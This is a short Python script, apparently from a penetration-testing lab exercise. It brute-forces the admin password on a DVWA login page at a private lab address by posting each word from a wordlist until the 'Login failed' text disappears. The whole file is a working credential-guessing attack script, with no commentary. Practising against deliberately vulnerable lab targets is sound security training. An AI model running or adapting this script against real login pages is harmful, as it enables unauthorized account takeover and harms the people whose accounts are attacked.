#!/usr/bin/env python

import requests


target_url = "http://10.0.2.14/dvwa/login.php"
data_dict = {"username":"admin","password":"","Login":"submit"}


with open("password.list", "r")  as wordlist_file:
    for line in wordlist_file:
        print(line)
        word = line.strip()
        print(word)
        data_dict["password"] = word
        response = requests.post(target_url.encode(), data=data_dict)
        if "Login failed" not in response.content.decode():
            print("[+] Got the password --> " + word)
            exit()

print("[-] Reached end of line")